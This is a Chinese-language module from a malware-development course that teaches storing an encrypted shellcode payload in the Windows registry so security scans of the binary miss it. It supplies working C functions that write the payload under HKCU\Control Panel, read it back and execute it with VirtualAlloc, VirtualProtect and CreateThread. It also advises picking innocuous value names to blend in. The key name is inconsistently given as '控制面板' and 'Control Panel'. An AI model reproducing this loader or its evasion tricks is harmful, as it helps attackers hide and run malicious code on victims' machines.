模块 31 - Payload 暂存 - Windows注册表

上一节讲到，有效载荷不必储存在恶意软件内部。相反，有效载荷可在运行时由恶意软件获取。本节将演示类似技术，不同之处在于有效载荷被写为注册表键值，然后在需要时从注册表中获取。由于有效载荷将存储在注册表中，如果安全解决方案扫描恶意软件，将无法在其中检测或找到任何有效载荷。

本节中的代码分为两部分。第一部分是将加密的有效载荷写入注册表项。第二部分从同一注册表项中读取有效载荷，解密并执行它。本节不会解释加密/解密过程，因为这已在前几节中讲述。

本节还将介绍条件编译的概念。

条件编译

条件编译是一种用于促使编译器在项目中编译或不编译代码的方法。这将由实现决定是否读取或写入注册表。

以下两个章节提供了骨架代码，说明如何使用条件编译编写读取和写入操作。

写入操作

#define WRITEMODE

// 将在两种情况下都编译的代码

// 如果定义了“WRITEMODE”
#ifdef WRITEMODE
    // 将编译的代码
    // 将有效载荷写入注册表所需的代码
#endif

// 如果定义了“READMODE”
#ifdef READMODE
    // 将不会编译的代码
#endif

读取操作

#define READMODE

// 在两种情况下都会编译的代码

// 如果定义了“READMODE”
#ifdef READMODE
    // 将要编译的代码
    // 从注册表读取有效负载所需的代码
#endif

// 如果定义了“WRITEMODE”
#ifdef WRITEMODE
    // 将不会编译的代码
#endif

将信息写入注册表

本节将讲解 WriteShellcodeToRegistry 函数。此函数接受两个参数：

  1. pShellcode - 要写入的有效数据。
  2. dwShellcodeSize - 要写入的有效数据大小。

注册表和注册表字符串

代码一开始定义了两个预设常量 REGISTRY 和 REGSTRING，它们分别被设置为“控制面板”和“MalDevAcademy”。

// 要读取和写入的注册表键
#define     REGISTRY            "控制面板"
#define     REGSTRING           "MalDevAcademy"

REGISTRY 是将存储有效负载的注册表项的名称。REGISTRY 的完整路径为：Computer\HKEY_CURRENT_USER\控制面板。

此函数在编程方面将执行的操作是在此注册表键下创建一个用于存储有效负载的 String Value（字符串值）。REGSTRING 是将创建的字符串值的名字。显然，在实际情况下，使用 PanelUpdateService 或 AppSnapshot 这样的更贴切的值。

打开注册表项句柄

RegOpenKeyExA WinAPI 用于打开指定注册表项的句柄，这是在注册表项下创建、编辑或删除值的先决条件。

LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey, // 用于打开注册表项句柄
  [in, optional] LPCSTR lpSubKey, // 要打开的注册表子项名称（注册表常量）
  [in]           DWORD  ulOptions, // 指定打开键时应用的选项 - 设为 0
  [in]           REGSAM samDesired, // 访问权限
  [out]          PHKEY  phkResult // 指向接收已打开密钥句柄的变量的指针
);

RegOpenKeyExA WinAPI 的第四个参数定义了对注册表项的访问权限。由于程序需要在注册表项下创建值，因此选择了 KEY_SET_VALUE。完整的注册表访问权限列表可以在 此处 找到。

STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);

设置注册表值

接下来，我们使用 RegSetValueExA WinAPI，该 API 从 RegOpenKeyExA 获取打开的句柄，并基于第二个参数 REGSTRING 创建一个新值。它还将写入有效载荷到新创建的值中。

LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // 一个打开的注册表项的句柄
  [in, optional] LPCSTR     lpValueName,     // 要设置的值的名称（REGSTRING 常量）
                 DWORD      Reserved,        // 设置为 0
  [in]           DWORD      dwType,          // 由 lpData 参数所指向数据的类型
  [in]           const BYTE *lpData,         // 要存储的数据
  [in]           DWORD      cbData           // 由 lpData 参数所指向的信息的大小（以字节为单位）
);

此外，需要注意的是，第四个参数指定了注册表值的类型。在本例中，它被设置为 REG_BINARY，因为有效载荷只是一个字节列表，但完整的数据类型列表可在此处找到 此处。

STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);

关闭注册表项句柄

最后，使用 RegCloseKey 来关闭已打开的注册表项的句柄。

LSTATUS RegCloseKey(
  [in] HKEY hKey // 待关闭的已打开注册表项的句柄
);

向注册表写入 - 代码片段

// 要读取/写入的注册表项
#define REGISTRY            "Control Panel"
#define REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf("[i] 将 0x%p [ 大小: %ld ] 写入 \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey); // 打开注册表项
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA 失败，错误代码：%d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize); // 设置注册表项的值
    if (ERROR_SUCCESS != STATUS){
        printf("[!] RegSetValueExA 失败，错误代码：%d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] 完成！ \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

读注册表

在有效将可执行代码写入 Computer\HKEY_CURRENT_USER\Control Panel 注册表项中 MalDevAcademy 代码字符串之后，下一步是创建一个负责处理解密过程的其他实现，类似于 HellShell.exe 程序提供的实现。

本节将逐步讲解如下所示的 ReadShellcodeFromRegistry 函数。此函数带两个参数：

  • ppPayload - 指向 PBYTE 变量的指针，此变量在函数返回时用于保存读取的可执行代码的基地址。
  • psSize - 读取的可执行代码的大小。

读注册表值

RegGetValueA 函数需要指定要读取的注册表项和值，即 REGISTRY 和 REGSTRING。在前一个模块中，可以分多次获取互联网上的任何大小的数据块，然而，RegGetValueA 读取数据时不是将这些字节流当作数据流处理，而是会一次性全部读取。相反，需要两次调用 RegGetValueA，第一次获取数据的长度，分配足够大的内存来保存数据，然后第二次调用 RegGetValueA 将数据读入已分配的缓冲区。

LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // 打开的注册表项句柄
  [in, optional]      LPCSTR  lpSubKey, // 相对于 hkey 参数指定的项的注册表项路径
  [in, optional]      LPCSTR  lpValue,  // 注册表值的名称
  [in, optional]      DWORD   dwFlags,  // 限制要查询的值的数据类型的标志
  [out, optional]     LPDWORD pdwType,  // 指向接收指示指定值中存储的数据类型的代码的变量的指针
  [out, optional]     PVOID   pvData,   // 指向接收值数据的缓冲区的指针
  [in, out, optional] LPDWORD pcbData   // 指向指定 pvData 参数指向的缓冲区大小的变量的指针（以字节为单位）
);

第四个参数 dwFlags 可以用于限制数据类型，但是，此实现中使用了 RRF_RT_ANY，表示任意数据类型。或者，由于有效载荷是二进制数据类型，也可以使用 RRF_RT_REG_BINARY。下面的代码片段演示如何调用 RegGetValueA 来获取有效载荷大小。

// 将 'pvData' 参数设置为 'NULL'。函数返回后，有效载荷大小将保存在 'dwBytesRead' 变量中。
LSTATUS STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
// 使用 'dwBytesRead' 变量分配足够大的内存来保存有效载荷
PBYTE   pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);

调用 HeapAlloc 后，可以在代码中继续调用 RegGetValueA 来从注册表获取有效载荷。第二个调用的内容应如下所示：

// 将 'pvData' 参数设置为 'pBytes'，用于将有效载荷写入其中。
LSTATUS STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);

从注册表读取 Shellcode - 代码片段

BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

    LSTATUS     STATUS      = NULL;
    DWORD       dwBytesRead = NULL;
    PVOID       pBytes      = NULL;

    // 获取有效负载的大小
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA 出错： %d\n", STATUS);
        return FALSE;
    }

    // 分配堆空间来存储将要读取的有效负载
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL){
        printf("[!] HeapAlloc 出错： %d\n", GetLastError());
        return FALSE;
    }

    // 从注册表项“REGISTRY”，读取值“REGSTRING”，得到有效负载
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA 出错： %d\n", STATUS);
        return FALSE;
    }

    // 保存
    *ppPayload  = pBytes;
    *psSize     = dwBytesRead;

    return TRUE;
}

执行 Payload

从注册表中读取并存储到分配的缓存中之后，RunShellcode 函数可以用来执行 Payload。注意，此函数已在前序模块中介绍。

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
  • PVOID：指针类型，指向任意类型的变量。
  • MEM_COMMIT：分配内存并提交给系统。
  • MEM_RESERVE：分配内存但尚未提交给系统。
  • PAGE_READWRITE：内存页具有读写权限。
  • VirtualAlloc：分配或保留虚拟内存。
  • VirtualProtect：更改虚拟内存页的保护属性。
